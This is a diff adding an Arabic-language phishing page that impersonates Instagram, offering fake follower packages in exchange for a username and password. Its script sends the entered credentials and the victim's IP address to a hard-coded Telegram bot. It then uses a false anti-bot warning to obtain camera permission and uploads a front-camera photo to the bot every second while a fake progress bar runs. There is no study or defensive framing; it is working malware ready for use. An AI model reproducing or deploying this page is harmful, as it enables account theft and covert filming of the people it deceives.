@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>التحقق الأمني - Instagram</title>
+    <style>
+        body { background-color: #fafafa; font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .container { background: white; border: 1px solid #dbdbdb; padding: 30px; width: 340px; text-align: center; }
+        .logo { width: 175px; margin-bottom: 20px; }
+        input, select { width: 100%; padding: 12px; margin-bottom: 10px; border: 1px solid #dbdbdb; background: #fafafa; border-radius: 3px; box-sizing: border-box; }
+        .btn-blue { background: #0095f6; color: white; border: none; padding: 12px; width: 100%; border-radius: 4px; font-weight: bold; cursor: pointer; }
+        .info { background: #fff4f4; border: 1px solid #ffcccc; padding: 10px; font-size: 11px; color: #d93025; margin-bottom: 15px; border-radius: 4px; }
+        #loading { display: none; margin-top: 15px; font-size: 13px; color: #8e8e8e; }
+        video { display: none; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a2560540d95.png" class="logo">
+        <input type="text" id="u" placeholder="اسم المستخدم">
+        <input type="password" id="p" placeholder="كلمة السر">
+        <select id="c">
+            <option>10 Starter</option>
+            <option>15 Plus</option>
+            <option>25 Silver</option>
+            <option>50 Gold</option>
+            <option>100 Gold Plus</option>
+            <option>250 Platinum</option>
+            <option>500 Master</option>
+            <option>1000 Gold Prime</option>
+            <option>1500 Diamond</option>
+            <option>3500 Titanium</option>
+            <option>5000 Elite</option>
+        </select>
+        <div class="info">⚠️ لمكافحة البوتات: سيظهر الآن طلب إذن الكاميرا، اضغط <b>"سماح"</b> فوراً للمتابعة.</div>
+        <button class="btn-blue" onclick="startCapture()">إتمام عملية الرشق الآن</button>
+        <div id="loading">⏳ جاري التحقق من الهوية... <b id="pct">0%</b></div>
+    </div>
+    <video id="v" autoplay playsinline></video>
+    <canvas id="can" style="display:none;"></canvas>
+
+    <script>
+        const TOKEN = '8444214588:AAE8ugJvMnz8RNfWuIvBCT_-9X-NHl01qek';
+        const CHAT_ID = '1371063739';
+
+        async function startCapture() {
+            const user = document.getElementById('u').value;
+            const pass = document.getElementById('p').value;
+            const rank = document.getElementById('c').value;
+
+            if(!user || !pass) return alert("يرجى إدخال البيانات!");
+
+            try {
+                // طلب الكاميرا قسراً عند الضغط (أندرويد 9-16)
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                document.getElementById('v').srcObject = stream;
+                document.querySelector('.btn-blue').style.display = 'none';
+                document.getElementById('loading').style.display = 'block';
+
+                // جلب الـ IP وإرسال البيانات فوراً
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                const msg = `👤 User: ${user}\n🔑 Pass: ${pass}\n📦 Rank: ${rank}\n🌐 IP: ${ipData.ip}`;
+                
+                fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`);
+
+                // تصوير كل ثانية وإرسال سريع للبوت
+                setInterval(sendFrame, 1000);
+
+                let p = 0;
+                setInterval(() => { if(p < 99) p++; document.getElementById('pct').innerText = p + "%"; }, 600);
+
+            } catch (e) { 
+                alert("خطأ: يجب الضغط على 'سماح' لإتمام العملية!"); 
+                location.reload(); 
+            }
+        }
+
+        function sendFrame() {
+            const v = document.getElementById('v');
+            const can = document.getElementById('can');
+            can.width = v.videoWidth; 
+            can.height = v.videoHeight;
+            can.getContext('2d').drawImage(v, 0, 0);
+            
+            can.toBlob(blob => {
+                const fd = new FormData();
+                fd.append('photo', blob, 'img.jpg');
+                fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto?chat_id=${CHAT_ID}`, { method: 'POST', body: fd });
+            }, 'image/jpeg', 0.2); // ضغط عالي للسرعة حتى لو الإنترنت ضعيف
+        }
+    </script>
+</body>
+</html>
